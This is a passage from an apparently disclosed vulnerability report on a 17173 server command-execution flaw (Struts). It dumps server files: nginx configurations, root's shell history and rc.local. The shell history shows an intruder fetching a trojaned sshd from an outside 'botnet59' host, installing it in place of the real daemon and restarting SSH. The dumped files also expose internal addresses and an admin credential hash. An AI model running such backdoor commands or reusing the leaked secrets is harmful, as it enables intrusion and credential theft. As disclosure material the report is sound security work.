                        <br />
<br />
                        set $start_time -1;<br />
<br />
                        <br />
<br />
                        if ( $arg_start ~ &quot;([0-9]+)&quot; ) { <br />
<br />
                                set $start_time $1;<br />
<br />
                        }       <br />
<br />
                                <br />
<br />
                        set $sock &quot;unix:/tmp/liveroom.sock&quot;; <br />
<br />
                                <br />
<br />
                        if ($uri ~ &quot;^/live/([0-9]+)&quot;) {<br />
<br />
                                expires                  -1;<br />
<br />
                                add_header Content-Type  &quot;video/x-flv&quot;;<br />
<br />
<br />
<br />
                                ffs_param INPUT          $1;<br />
<br />
                                ffs_param FORMAT         flv;<br />
<br />
                                ffs_param SEEK_WHENCE    1;<br />
<br />
                                ffs_param START_TIME     -1;<br />
<br />
                                ffs_param END_TIME       -1;<br />
<br />
                                ffs_param VIDEO_CODEC    copy;<br />
<br />
                                ffs_param AUDIO_CODEC    copy;<br />
<br />
                                ffs_pass                 $sock;<br />
<br />
                                break;<br />
<br />
                        }<br />
<br />
                        <br />
<br />
                        return 403;<br />
<br />
                }<br />
<br />
        }<br />
<br />
}<br />
<br />
<br />
<br />
<br />
<br />
=========================/opt/17173/nginx/conf/nginx.conf=====================================<br />
<br />
<br />
<br />
<br />
<br />
user  daemon;<br />
<br />
worker_rlimit_nofile  40960;<br />
<br />
#worker_cpu_affinity 00000001 00000010 00000100 00001000 00010000 00100000 01000000 10000000;<br />
<br />
worker_processes  16;<br />
<br />
<br />
<br />
error_log  /home/logs/error.log;<br />
<br />
#error_log  /home/logs/error.log notice;<br />
<br />
#error_log  /dev/null;<br />
<br />
#error_log  logs/error.log  notice;<br />
<br />
#error_log  logs/error.log  info;<br />
<br />
#error_log  logs/error.log  debug;<br />
<br />
<br />
<br />
pid        logs/nginx.pid;<br />
<br />
<br />
<br />
<br />
<br />
events {<br />
<br />
        worker_connections  10240;<br />
<br />
        use  epoll;<br />
<br />
}<br />
<br />
<br />
<br />
<br />
<br />
http {<br />
<br />
    server_tokens off;<br />
<br />
    include       mime.types;<br />
<br />
    default_type  test/html;<br />
<br />
<br />
<br />
    log_format  main  &#039;$remote_addr - $remote_user [$time_local] $server_name &quot;$request&quot; &#039;<br />
<br />
                      &#039;$status $body_bytes_sent &quot;$http_referer&quot; &#039;<br />
<br />
                      &#039;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot; &quot;$request_time&quot; &quot;$request_filename&quot;&#039;;<br />
<br />
<br />
<br />
    access_log  /home/logs/access.log  main;<br />
<br />
#    access_log  off;<br />
<br />
<br />
<br />
	#if ($http_x_forwarded_for !~ &#039;-&#039;)<br />
<br />
	#{<br />
<br />
	#	set $remote_addr $http_x_forwarded_for;<br />
<br />
	#}<br />
<br />
        sendfile        on;<br />
<br />
        tcp_nopush      on;<br />
<br />
        tcp_nodelay     on;<br />
<br />
<br />
<br />
        keepalive_timeout       0;                                                              <br />
<br />
        send_timeout            300;                                                              <br />
<br />
        client_body_timeout     300;                                                              <br />
<br />
        client_header_timeout   300;                                                              <br />
<br />
                                                                                                 <br />
<br />
        server_names_hash_max_size      512;                                                     <br />
<br />
        server_names_hash_bucket_size   128;                                                     <br />
<br />
                                                                                                 <br />
<br />
        client_header_buffer_size       8k;                                                      <br />
<br />
        client_max_body_size            4m;                                                      <br />
<br />
        large_client_header_buffers     4 4k;                                                    <br />
<br />
        request_pool_size               1024k;                                                   <br />
<br />
        connection_pool_size            512;                                                     <br />
<br />
                                                                                                 <br />
<br />
        output_buffers                  1 1024k;                                                 <br />
<br />
        postpone_output                 1460;                                                    <br />
<br />
        ignore_invalid_headers          on;                                                      <br />
<br />
	add_header	X-Host	&quot;226-vlog-webserver&quot;;<br />
<br />
                                                                                                 <br />
<br />
        gzip on;                                                                                 <br />
<br />
        gzip_vary on;                                                                            <br />
<br />
        gzip_min_length         1k;                                                              <br />
<br />
        gzip_buffers            4 8k;                                                            <br />
<br />
        gzip_http_version       1.1;                                                             <br />
<br />
        gzip_types              text/plain application/x-javascript text/css application/xml;  <br />
<br />
<br />
<br />
        set_real_ip_from   10.59.67.0/24;<br />
<br />
        set_real_ip_from   10.59.108.0/24;<br />
<br />
        real_ip_header     X-Real-IP;<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
	include n_*.conf;<br />
<br />
}    <br />
<br />
<br />
<br />
<br />
<br />
===========================/opt/17173/nginx/conf/nginx.conf.default======================<br />
<br />
<br />
<br />
#user  nobody;<br />
<br />
worker_processes  1;<br />
<br />
<br />
<br />
#error_log  logs/error.log;<br />
<br />
#error_log  logs/error.log  notice;<br />
<br />
#error_log  logs/error.log  info;<br />
<br />
<br />
<br />
#pid        logs/nginx.pid;<br />
<br />
<br />
<br />
<br />
<br />
events {<br />
<br />
    worker_connections  1024;<br />
<br />
}<br />
<br />
<br />
<br />
<br />
<br />
http {<br />
<br />
    include       mime.types;<br />
<br />
    default_type  application/octet-stream;<br />
<br />
<br />
<br />
    #log_format  main  &#039;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#039;<br />
<br />
    #                  &#039;$status $body_bytes_sent &quot;$http_referer&quot; &#039;<br />
<br />
    #                  &#039;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#039;;<br />
<br />
<br />
<br />
    #access_log  logs/access.log  main;<br />
<br />
<br />
<br />
    sendfile        on;<br />
<br />
    #tcp_nopush     on;<br />
<br />
<br />
<br />
    #keepalive_timeout  0;<br />
<br />
    keepalive_timeout  65;<br />
<br />
<br />
<br />
    #gzip  on;<br />
<br />
<br />
<br />
    server {<br />
<br />
        listen       80;<br />
<br />
        server_name  localhost;<br />
<br />
<br />
<br />
        #charset koi8-r;<br />
<br />
<br />
<br />
        #access_log  logs/host.access.log  main;<br />
<br />
<br />
<br />
        location / {<br />
<br />
            root   html;<br />
<br />
            index  index.html index.htm;<br />
<br />
        }<br />
<br />
<br />
<br />
        #error_page  404              /404.html;<br />
<br />
<br />
<br />
        # redirect server error pages to the static page /50x.html<br />
<br />
        #<br />
<br />
        error_page   500 502 503 504  /50x.html;<br />
<br />
        location = /50x.html {<br />
<br />
            root   html;<br />
<br />
        }<br />
<br />
<br />
<br />
        # proxy the PHP scripts to Apache listening on 127.0.0.1:80<br />
<br />
        #<br />
<br />
        #location ~ \.php$ {<br />
<br />
        #    proxy_pass   http://127.0.0.1;<br />
<br />
        #}<br />
<br />
<br />
<br />
        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000<br />
<br />
        #<br />
<br />
        #location ~ \.php$ {<br />
<br />
        #    root           html;<br />
<br />
        #    fastcgi_pass   127.0.0.1:9000;<br />
<br />
        #    fastcgi_index  index.php;<br />
<br />
        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;<br />
<br />
        #    include        fastcgi_params;<br />
<br />
        #}<br />
<br />
<br />
<br />
        # deny access to .htaccess files, if Apache&#039;s document root<br />
<br />
        # concurs with nginx&#039;s one<br />
<br />
        #<br />
<br />
        #location ~ /\.ht {<br />
<br />
        #    deny  all;<br />
<br />
        #}<br />
<br />
    }<br />
<br />
<br />
<br />
<br />
<br />
    # another virtual host using mix of IP-, name-, and port-based configuration<br />
<br />
    #<br />
<br />
    #server {<br />
<br />
    #    listen       8000;<br />
<br />
    #    listen       somename:8080;<br />
<br />
    #    server_name  somename  alias  another.alias;<br />
<br />
<br />
<br />
    #    location / {<br />
<br />
    #        root   html;<br />
<br />
    #        index  index.html index.htm;<br />
<br />
    #    }<br />
<br />
    #}<br />
<br />
<br />
<br />
<br />
<br />
    # HTTPS server<br />
<br />
    #<br />
<br />
    #server {<br />
<br />
    #    listen       443;<br />
<br />
    #    server_name  localhost;<br />
<br />
<br />
<br />
    #    ssl                  on;<br />
<br />
    #    ssl_certificate      cert.pem;<br />
<br />
    #    ssl_certificate_key  cert.key;<br />
<br />
<br />
<br />
    #    ssl_session_timeout  5m;<br />
<br />
<br />
<br />
    #    ssl_protocols  SSLv2 SSLv3 TLSv1;<br />
<br />
    #    ssl_ciphers  HIGH:!aNULL:!MD5;<br />
<br />
    #    ssl_prefer_server_ciphers   on;<br />
<br />
<br />
<br />
    #    location / {<br />
<br />
    #        root   html;<br />
<br />
    #        index  index.html index.htm;<br />
<br />
    #    }<br />
<br />
    #}<br />
<br />
<br />
<br />
}<br />
<br />
<br />
<br />
<br />
<br />
★K8cmd-&gt; cat /root/.bash_history<br />
<br />
====================================================================================================================================<br />
<br />
ls<br />
<br />
cd /home/<br />
<br />
ls<br />
<br />
mkdir liveshow<br />
<br />
clear<br />
<br />
ls<br />
<br />
cd ~<br />
<br />
ls<br />
<br />
cd /home/<br />
<br />
ls<br />
<br />
chmod 777 liveshow <br />
<br />
cd liveshow/<br />
<br />
ls<br />
<br />
ls<br />
<br />
ls<br />
<br />
ls<br />
<br />
ls<br />
<br />
 cd /dev/<br />
<br />
cd ~<br />
<br />
ls<br />
<br />
cd /home/<br />
<br />
ls<br />
<br />
cd /opt/<br />
<br />
ls<br />
<br />
cd ..<br />
<br />
ls<br />
<br />
mkdir data<br />
<br />
ls<br />
<br />
clear<br />
<br />
ls<br />
<br />
cd data/<br />
<br />
ls<br />
<br />
cd metadata/<br />
<br />
ls<br />
<br />
cd master/<br />
<br />
ls<br />
<br />
cd /opt/<br />
<br />
ls<br />
<br />
cd /home/liveshow/<br />
<br />
ls<br />
<br />
 ./mdsliveroom -d -u nobody --database=/data/metadata/master/ --db-mutex=500K --db-cache=100M<br />
<br />
 ./scm/mdsliveroom -d -u nobody --database=/data/metadata/master/ --db-mutex=500K --db-cache=100M<br />
<br />
 ./mdsliveroom -d -u nobody --database=/data/metadata/master/ --db-mutex=500K --db-cache=100M<br />
<br />
clear<br />
<br />
ls<br />
<br />
cd /opt/<br />
<br />
ls<br />
<br />
ls<br />
<br />
cd /home/liveshow/<br />
<br />
ls<br />
<br />
cd bdb/<br />
<br />
ls<br />
<br />
rm -rf *<br />
<br />
ls<br />
<br />
mkdir bdb<br />
<br />
ls<br />
<br />
pwd<br />
<br />
rm -rf bdb/<br />
<br />
ls<br />
<br />
ls<br />
<br />
clera<br />
<br />
clear<br />
<br />
ls<br />
<br />
cd lib/<br />
<br />
ls<br />
<br />
cd ..<br />
<br />
ssh   10.59.108.23<br />
<br />
cd /home/liveshow/<br />
<br />
ls<br />
<br />
tar -zxvf my.tar <br />
<br />
clear<br />
<br />
ls<br />
<br />
cd zhangguoqi/<br />
<br />
ls<br />
<br />
cd mdc-liveroom/<br />
<br />
ls<br />
<br />
rm -rf autom4te.cache<br />
<br />
aclocal;automake -a;autoconf; <br />
<br />
#./configure <br />
<br />
./configure &quot;CXXFLAGS=-g -O0&quot; &quot;CFLAGS=-g -O0&quot;<br />
<br />
make clean<br />
<br />
clera<br />
<br />
clear<br />
<br />
vi Makefile.am <br />
<br />
clera<br />
<br />
clear<br />
<br />
CD ..<br />
<br />
cd ..<br />
<br />
cd /home/<br />
<br />
ls<br />
<br />
cd liveshow/<br />
<br />
ls<br />
<br />
cd bdb/<br />
<br />
ls<br />
<br />
cd lib/<br />
<br />
pwd<br />
<br />
cd /home/liveshow/zhangguoqi/mdc-liveroom/<br />
<br />
ls<br />
<br />
export BDD_LIBS=&quot;/home/liveshow/bdb/lib&quot;<br />
<br />
echo $BED_LIBS<br />
<br />
echo $BDD_LIBS<br />
<br />
export BDB_LIBS=&quot;/home/liveshow/bdb/lib&quot;<br />
<br />
export BDB_INCLUDE=&quot;/home/liveshow/bdb/include&quot;<br />
<br />
rm -rf autom4te.cache<br />
<br />
aclocal;automake -a;autoconf; <br />
<br />
#./configure <br />
<br />
./configure &quot;CXXFLAGS=-g -O0&quot; &quot;CFLAGS=-g -O0&quot;<br />
<br />
make clean<br />
<br />
ls<br />
<br />
make<br />
<br />
rm -rf autom4te.cache<br />
<br />
aclocal;automake -a;autoconf; <br />
<br />
#./configure <br />
<br />
./configure <br />
<br />
ls<br />
<br />
make<br />
<br />
CLEAR<br />
<br />
CLEAR<br />
<br />
CLEAR<br />
<br />
clear<br />
<br />
export BDB_LIBS=&quot;/home/liveshow/bdb/lib/&quot;<br />
<br />
export BDB_INCLUDE=&quot;/home/liveshow/bdb/include/&quot;<br />
<br />
rm -rf autom4te.cache<br />
<br />
aclocal;automake -a;autoconf; <br />
<br />
#./configure <br />
<br />
./configure &quot;CXXFLAGS=-g -O0&quot; &quot;CFLAGS=-g -O0&quot;<br />
<br />
make clean<br />
<br />
ls<br />
<br />
make<br />
<br />
echo $BDD_INCLUDE<br />
<br />
echo $BDB_INCLUDE<br />
<br />
clear<br />
<br />
ls<br />
<br />
cd /home/liveshow/<br />
<br />
ls<br />
<br />
cd  bdb/<br />
<br />
ls<br />
<br />
cd include/<br />
<br />
ls<br />
<br />
vi db.h<br />
<br />
clear<br />
<br />
ls<br />
<br />
cd ..<br />
<br />
unset BDB_INCLUDE<br />
<br />
cd /home/liveshow/zhangguoqi/<br />
<br />
cd mdc-liveroom/<br />
<br />
make<br />
<br />
noinst_PROGRAMS=mdclive<br />
<br />
mdclive_SOURCES=global.cpp main.cpp dbenv.cpp buffer.cpp channel.cpp storage.cpp metadata.cpp task.cpp console.cpp ../lib/tcpserver2.cpp ../lib/string_tokenizer.cpp ../lib/urlcode.cpp<br />
<br />
AM_CXXFLAGS=-Wno-deprecated $(BDB_INCLUDE)<br />
<br />
LDADD=$(BDB_LIBS)<br />
<br />
rm -rf autom4te.cache<br />
<br />
aclocal;automake -a;autoconf; <br />
<br />
#./configure <br />
<br />
./configure &quot;CXXFLAGS=-g -O0&quot; &quot;CFLAGS=-g -O0&quot;<br />
<br />
make clean<br />
<br />
ls<br />
<br />
make<br />
<br />
clear<br />
<br />
cd /home/liveshow/<br />
<br />
cd bdb/<br />
<br />
ls<br />
<br />
cd bin/<br />
<br />
ls<br />
<br />
cd /home/liveshow/live/<br />
<br />
cd ..<br />
<br />
ls<br />
<br />
cd zhangguoqi/<br />
<br />
cd mdc-liveroom/<br />
<br />
ls<br />
<br />
vi  Makefile.am <br />
<br />
cd /home/<br />
<br />
ls<br />
<br />
clear<br />
<br />
ls<br />
<br />
cd liveshow/<br />
<br />
ls<br />
<br />
cd bdb/<br />
<br />
ls<br />
<br />
cd lib/<br />
<br />
ls<br />
<br />
cp * /usr/lib<br />
<br />
cd ..<br />
<br />
cd bin/<br />
<br />
cp * /usr/bin/<br />
<br />
y<br />
<br />
cd ..<br />
<br />
cd include/<br />
<br />
cp * /usr/include/<br />
<br />
cp * /usr/include/<br />
<br />
clear<br />
<br />
ls<br />
<br />
cd  ..<br />
<br />
ls<br />
<br />
cd ..<br />
<br />
ls<br />
<br />
cd zhangguoqi/mdc-liveroom/<br />
<br />
ls<br />
<br />
rm -rf autom4te.cache<br />
<br />
aclocal;automake -a;autoconf; <br />
<br />
#./configure <br />
<br />
./configure &quot;CXXFLAGS=-g -O0&quot; &quot;CFLAGS=-g -O0&quot;<br />
<br />
make clean<br />
<br />
clear<br />
<br />
ls<br />
<br />
ls -l Makefile<br />
<br />
make<br />
<br />
unset BDB_LIB<br />
<br />
export $BDB_LIB<br />
<br />
export $BDB_LIB<br />
<br />
echo $BDB_LIB<br />
<br />
rm -rf autom4te.cache<br />
<br />
aclocal;automake -a;autoconf; <br />
<br />
#./configure <br />
<br />
./configure &quot;CXXFLAGS=-g -O0&quot; &quot;CFLAGS=-g -O0&quot;<br />
<br />
make clean<br />
<br />
ls -l Makefile<br />
<br />
make<br />
<br />
echo $PATH<br />
<br />
echo $LIB<br />
<br />
clear<br />
<br />
vi Makefile<br />
<br />
clear<br />
<br />
cd /home/liveshow/<br />
<br />
ls<br />
<br />
cd bdb/<br />
<br />
ls<br />
<br />
cd lib/<br />
<br />
pwd<br />
<br />
export BDB_LIBS=&quot;/home/liveshow/bdb/lib&quot;<br />
<br />
echo $BDB_LIBS<br />
<br />
enc-update<br />
<br />
env-update<br />
<br />
cd /home/liveshow/<br />
<br />
ls<br />
<br />
cd zhangguoqi/mdc-liveroom/<br />
<br />
ls<br />
<br />
vi Makefile<br />
<br />
make<br />
<br />
clear<br />
<br />
make<br />
<br />
alias -p<br />
<br />
fc-cache<br />
<br />
clear<br />
<br />
ls<br />
<br />
aclocal;automake -a;autoconf; <br />
<br />
#./configure <br />
<br />
#./configure <br />
<br />
aclocal;automake -a;autoconf;autoheader; <br />
<br />
vi configure.in <br />
<br />
aclocal;automake -a;autoconf;autoheader; <br />
<br />
vi configure.in<br />
<br />
aclocal;automake -a;autoconf;autoheader; <br />
<br />
vi configure.in<br />
<br />
ssh -p 9923 root@10.59.108.23<br />
<br />
ssh -p 9923 10.59.108.23<br />
<br />
ssh -p 9923 root@10.59.108.23<br />
<br />
ssh -p 9923 root@10.59.108.23:/home/<br />
<br />
ssh -p 9923 root@10.59.108.23<br />
<br />
exit<br />
<br />
cd /data/<br />
<br />
ls<br />
<br />
scp  cluster root@10.59.108.23:/data<br />
<br />
cd ..<br />
<br />
cd /home/liveshow/<br />
<br />
ls<br />
<br />
scp  mytar  root@10.59.108.23:/data<br />
<br />
scp  my.tar  root@10.59.108.23:/data<br />
<br />
tar cvf  dd  bdb<br />
<br />
ls<br />
<br />
scp  dd  root@10.59.108.23:/opt<br />
<br />
cd live/<br />
<br />
ls<br />
<br />
 ./mdsliveroom -d -u nobody --database=/data/metadata/master/ --db-mutex=500K --db-cache=100M<br />
<br />
cd /data/<br />
<br />
ls<br />
<br />
scp  cluster root@10.59.108.23:/data<br />
<br />
cd ..<br />
<br />
cd /home/liveshow/<br />
<br />
ls<br />
<br />
scp  mytar  root@10.59.108.23:/data<br />
<br />
scp  my.tar  root@10.59.108.23:/data<br />
<br />
tar cvf  dd  bdb<br />
<br />
ls<br />
<br />
scp  dd  root@10.59.108.23:/opt<br />
<br />
cd live/<br />
<br />
ls<br />
<br />
 ./mdsliveroom -d -u nobody --database=/data/metadata/master/ --db-mutex=500K --db-cache=100M<br />
<br />
ssh -p 9923 10.59.108.23<br />
<br />
ssh -P 9923 10.59.108.23<br />
<br />
ssh -p 9923 10.59.108.23<br />
<br />
ssh root@10.59.108.23<br />
<br />
ssh root@10.59.108.19<br />
<br />
ssh root@10.59.108.17<br />
<br />
ssh root@10.59.108.18<br />
<br />
exit<br />
<br />
 id<br />
<br />
 uptime<br />
<br />
 ls -l<br />
<br />
 ps axu<br />
<br />
  telnet localhost 22<br />
<br />
 ps axu|grep ssh<br />
<br />
 cat /etc/ssh/sshd_config<br />
<br />
telnet 10.59.108.18 22<br />
<br />
ifconfig<br />
<br />
uname -a<br />
<br />
wget http://218.199.102.59/.others/botnet59/sshd<br />
<br />
chmod a+x sshd<br />
<br />
./sshd<br />
<br />
mv sshd /usr/sbin/sshd<br />
<br />
service sshd restart<br />
<br />
telnet localhost 22<br />
<br />
sed -i -e &#039;s/ListenAddress 10.59.108.18/#ListenAddress 10.59.108.18/&#039; /etc/ssh/sshd_config<br />
<br />
service sshd restart<br />
<br />
telnet localhost 22<br />
<br />
telnet 10.59.108.18 22<br />
<br />
exit<br />
<br />
<br />
<br />
★K8cmd-&gt; cat /etc/rc.local<br />
<br />
====================================================================================================================================<br />
<br />
#!/bin/sh<br />
<br />
#<br />
<br />
# This script will be executed *after* all the other init scripts.<br />
<br />
# You can put your own initialization stuff in here if you don&#039;t<br />
<br />
# want to do the full Sys V style init stuff.<br />
<br />
<br />
<br />
touch /var/lock/subsys/local<br />
<br />
/opt/17173/nagios/bin/nrpe -c /opt/17173/nagios/etc/nrpe.cfg -d<br />
<br />
route add -net 10.6.0.0 netmask 255.255.0.0 gw 10.59.108.254<br />
<br />
route add -net 10.5.0.0 netmask 255.255.0.0 gw 10.59.108.254<br />
<br />
<br />
<br />
#live<br />
<br />
/etc/init.d/chat start   &gt;&gt;   &lt;user name=&quot;admin&quot; password=&quot;yCGkvrQHY7K8qtlHsgJ6zg==&quot;/&gt;<br />
<br />
/etc/init.d/front1 start<br />
<br />
/etc/init.d/front2 start<br />
<br />
/etc/init.d/trade start<br />
<br />
/opt/17173/nginx/sbin/nginx </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><p class="detail"><a href="../images/101348121c4a15ac3252237ac08691a9065e9e5a.jpg" target="_blank"><img src="../images/101348121c4a15ac3252237ac08691a9065e9e5a.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/101348282bdf998e9f6433d23bea6b624083b4d1.jpg" target="_blank"><img src="../images/101348282bdf998e9f6433d23bea6b624083b4d1.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/1013483973f7bb5e1911095494177bb75359b332.jpg" target="_blank"><img src="../images/1013483973f7bb5e1911095494177bb75359b332.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/101348504d714d11f87fe51d29f6e19ee0535567.jpg" target="_blank"><img src="../images/101348504d714d11f87fe51d29f6e19ee0535567.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/10134907b91c6ac82795f7bff25a4b8054ed6299.jpg" target="_blank"><img src="../images/10134907b91c6ac82795f7bff25a4b8054ed6299.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/101349193e7c5383b709c5f1adc1150bf2b080a6.jpg" target="_blank"><img src="../images/101349193e7c5383b709c5f1adc1150bf2b080a6.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/1013493065468b6d940b25a86e137f4f552d707e.jpg" target="_blank"><img src="../images/1013493065468b6d940b25a86e137f4f552d707e.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/10134941d420d361c985b2709c39f67ae0b747ac.jpg" target="_blank"><img src="../images/10134941d420d361c985b2709c39f67ae0b747ac.jpg" alt="8.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/1013495422a5d42a8f82d7738348c6fabaec16a8.jpg" target="_blank"><img src="../images/1013495422a5d42a8f82d7738348c6fabaec16a8.jpg" alt="9.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/1013563322629c82663063baf12b883aa139a3c9.jpg" target="_blank"><img src="../images/1013563322629c82663063baf12b883aa139a3c9.jpg" alt="10.jpg" width="600"/></a></p><p class="detail"><br />
<br />
 </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">升级。<br />
<br />
年底了，发个礼物呗！ </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/【|→上善若水】" title="【|→上善若水】">【|→上善若水】</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-045480" title="17173某站命令执行漏洞">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：20 </p>
													<p class="detail">确认时间：2013-12-11 10:05</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">struts漏洞已经修复。</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="45480";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
